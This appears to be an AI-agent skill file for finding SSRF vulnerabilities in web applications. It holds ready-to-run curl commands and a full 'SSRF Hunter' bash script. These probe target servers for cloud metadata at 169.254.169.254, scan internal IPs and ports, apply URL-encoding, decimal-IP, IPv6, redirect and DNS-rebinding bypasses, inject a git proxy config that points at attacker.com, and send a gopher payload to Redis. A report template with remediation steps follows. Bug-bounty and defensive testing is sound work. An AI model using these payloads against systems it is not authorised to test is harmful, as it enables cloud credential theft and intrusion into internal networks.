---
description: Find SSRF vulnerabilities in web applications. Use when testing for SSRF issues.
---

# SSRF Vulnerability Detection Tool

## High-Value Patterns from Real Reports

### Parameter Names (Priority Order)
```bash
# Primary SSRF parameters
url= callback= redirect= webhook= endpoint= uri= 
import_url= redirect_uri= next= return_url= continue=
destination= target= reference= referer= external_url=

# Secondary parameters
imapHost= proxy= server= host= domain= link= src=
image= avatar= preview= thumbnail= screenshot= pdf=
integration= template= subscription= notification=

# Headers to modify
Host: X-Forwarded-Host: X-Real-IP: X-Originating-IP:
```

### Common SSRF Endpoints
```bash
# Import/Integration endpoints
/api/*/import /admin/*/import */import_url
/api/*/integration /webhook /api/webhook
/subscription /notification /template

# Image/Media processing
/avatar /image /screenshot /pdf /preview
/thumbnail /media /upload

# Admin/Configuration 
/admin/*/create /admin/products/*/images
/api/*/configuration /settings /config

# Git/Repository related
/projects /repository /clone

# Proxy/Redirect endpoints
/proxy /redirect /goto /link /external
```

## Discovery Commands

### 1. Find Potential SSRF Parameters
```bash
# Crawl and find URLs with suspicious parameters
curl -s "$TARGET" | grep -oP '(href|src|action)="[^"]*\?[^"]*' | \
grep -E '(url|callback|redirect|webhook|endpoint|uri|import|proxy|host)='

# Check JavaScript for SSRF-prone functions
curl -s "$TARGET" | grep -oP 'fetch\([^)]*\)|XMLHttpRequest[^;]*|\.src\s*='
```

### 2. Automated Parameter Discovery
```bash
# Common parameter fuzzing
PARAMS="url callback redirect webhook endpoint uri import_url proxy host"
for param in $PARAMS; do
    echo "Testing parameter: $param"
    curl -s "$TARGET?$param=http://collaborator.domain" -o /dev/null
done
```

## Step-by-Step Testing Methodology

### Phase 1: Basic SSRF Detection

```bash
# Set up collaborator domain
COLLABORATOR="your-server.com"
TARGET="https://target.com/endpoint"

# Test 1: Direct parameter injection
curl -X GET "$TARGET?url=http://$COLLABORATOR/test1" \
  -H "User-Agent: Mozilla/5.0" \
  -L -s -o /dev/null

# Test 2: POST data injection
curl -X POST "$TARGET" \
  -H "Content-Type: application/json" \
  -d '{"url":"http://'$COLLABORATOR'/test2"}' \
  -s -o /dev/null

# Test 3: Form data injection
curl -X POST "$TARGET" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "url=http://$COLLABORATOR/test3" \
  -s -o /dev/null
```

### Phase 2: Internal Network Access

```bash
# Test internal IPs
INTERNAL_IPS="127.0.0.1 localhost 169.254.169.254 10.0.0.1 192.168.1.1 172.16.0.1"

for ip in $INTERNAL_IPS; do
    echo "Testing IP: $ip"
    curl -X POST "$TARGET" \
      -d "{\"url\":\"http://$ip\"}" \
      -H "Content-Type: application/json" \
      -w "Status: %{http_code}, Time: %{time_total}s\n" \
      -s -o /dev/null
done

# AWS metadata service
curl -X POST "$TARGET" \
  -d '{"url":"http://169.254.169.254/latest/meta-data/"}' \
  -H "Content-Type: application/json"
```

### Phase 3: Protocol and Port Testing

```bash
# Protocol testing
PROTOCOLS="http https ftp gopher dict file ldap"
for proto in $PROTOCOLS; do
    curl -X POST "$TARGET" \
      -d "{\"url\":\"$proto://$COLLABORATOR/\"}" \
      -H "Content-Type: application/json" \
      -s -o /dev/null
done

# Port scanning via timing
PORTS="22 23 25 53 80 110 143 443 993 995"
for port in $PORTS; do
    start_time=$(date +%s.%N)
    curl -X POST "$TARGET" \
      -d "{\"url\":\"http://127.0.0.1:$port\"}" \
      -H "Content-Type: application/json" \
      -s -o /dev/null --max-time 5
    end_time=$(date +%s.%N)
    duration=$(echo "$end_time - $start_time" | bc)
    echo "Port $port: ${duration}s"
done
```

### Phase 4: Bypass Techniques

```bash
# URL encoding bypasses
curl -X POST "$TARGET" \
  -d '{"url":"http://127.0.0.1%2F"}' \
  -H "Content-Type: application/json"

# Decimal IP bypass
curl -X POST "$TARGET" \
  -d '{"url":"http://2130706433/"}' \
  -H "Content-Type: application/json"

# IPv6 bypass
curl -X POST "$TARGET" \
  -d '{"url":"http://[::1]/"}' \
  -H "Content-Type: application/json"

# Redirect bypass
curl -X POST "$TARGET" \
  -d '{"url":"http://yourserver.com/redirect.php?url=http://169.254.169.254/"}' \
  -H "Content-Type: application/json"

# DNS rebinding bypass (requires custom DNS)
curl -X POST "$TARGET" \
  -d '{"url":"http://ssrf.yourserver.com/"}' \
  -H "Content-Type: application/json"

# Fragment bypass
curl -X POST "$TARGET" \
  -d '{"url":"http://example.com#@169.254.169.254/"}' \
  -H "Content-Type: application/json"
```

### Phase 5: Application-Specific Tests

```bash
# Git config injection (GitLab-style)
curl -X POST "$TARGET/projects" \
  -d 'import_url=http://user@google.com/.proxy=http://attacker.com:8500' \
  -H "Authorization: Bearer $TOKEN"

# SVG SSRF (Shopify-style)
curl -X POST "$TARGET/admin/products/123/images.json" \
  -F 'image[attachment]=@malicious.svg;filename=image.png' \
  -F 'Content-Type=image/svg+xml'

# Host header injection
curl -X GET "$TARGET" \
  -H "Host: internal.service.com" \
  -H "X-Forwarded-Host: internal.service.com"

# User-Agent based triggering (Prerender)
curl -X GET "$TARGET?javascript=window.location='http://collaborator.com'" \
  -H "User-Agent: SlackbotLinkExpanding 1.0 (+https://api.slack.com/robots)"
```

## Severity Rating Table

| Impact | Internal Access | Response Content | Ports | Severity |
|--------|----------------|------------------|-------|----------|
| External only | No | No | Limited | Low |
| Internal scan | Yes | No | Multiple | Medium |
| Internal access | Yes | Partial | Any | High |
| Full response | Yes | Full | Any | Critical |
| Cloud metadata | Yes | Full | 80,443 | Critical |
| RCE potential | Yes | Full | Any | Critical |

## False Positives to Ignore

```bash
# Legitimate external integrations
- Webhook endpoints that only accept whitelisted domains
- OAuth redirect_uri with strict validation
- CDN/image proxy services with proper filtering

# Expected behaviors
- 404/403 responses for blocked internal IPs
- Timeout responses (may indicate filtering)
- Same response for all internal IPs (likely blocked)
- Responses that don't contain internal data

# Verification commands
# Check if response changes with different internal IPs
curl -s "$TARGET?url=http://127.0.0.1" | md5sum
curl -s "$TARGET?url=http://192.168.1.1" | md5sum
# Different hashes = likely genuine SSRF
```

## Finding Report Template

```markdown
# SSRF Vulnerability Report

## Summary
Server-Side Request Forgery vulnerability allowing requests to internal network/services.

## Vulnerable Endpoint
- **URL**: [endpoint]
- **Parameter**: [parameter_name]
- **Method**: [GET/POST]

## Proof of Concept
```bash
curl -X POST "https://target.com/vulnerable/endpoint" \
  -H "Content-Type: application/json" \
  -d '{"url":"http://169.254.169.254/latest/meta-data/"}'
```

**Response**:
```
[Include response showing internal data]
```

## Impact Assessment
- [ ] Internal network scanning
- [ ] Cloud metadata access  
- [ ] Internal service access
- [ ] Sensitive data disclosure
- [ ] Potential RCE via internal services

## Affected Systems
- Internal IP ranges discovered: [list]
- Open internal ports: [list]
- Accessible services: [list]

## Technical Details
- Bypasses used: [URL encoding/IPv6/redirect/etc]
- Protocols supported: [http/https/gopher/etc]
- Response disclosure: [full/partial/timing-based]

## Remediation
1. Implement URL validation and whitelist allowed domains
2. Block private IP ranges (RFC 1918, RFC 3927, RFC 4193)
3. Disable unnecessary URL schemes (gopher, file, ftp)
4. Use network segmentation to limit internal access
5. Implement request timeouts and rate limiting
```

## Advanced Detection Scripts

```bash
#!/bin/bash
# SSRF Hunter Script

TARGET=$1
COLLABORATOR=$2

echo "[+] Starting SSRF detection on $TARGET"

# Function to test parameter
test_param() {
    local param=$1
    local payload=$2
    local method=$3
    
    if [ "$method" = "GET" ]; then
        response=$(curl -s -w "%{http_code}:%{time_total}" "$TARGET?$param=$payload")
    else
        response=$(curl -s -w "%{http_code}:%{time_total}" -X POST \
            -d "$param=$payload" "$TARGET")
    fi
    
    echo "[$method] $param=$payload -> $response"
}

# Test common parameters
params=(url callback redirect webhook endpoint uri import_url proxy host)
payloads=(
    "http://$COLLABORATOR/test"
    "http://127.0.0.1"
    "http://169.254.169.254"
    "gopher://127.0.0.1:6379/_INFO"
)

for param in "${params[@]}"; do
    for payload in "${payloads[@]}"; do
        test_param "$param" "$payload" "GET"
        test_param "$param" "$payload" "POST"
    done
done
```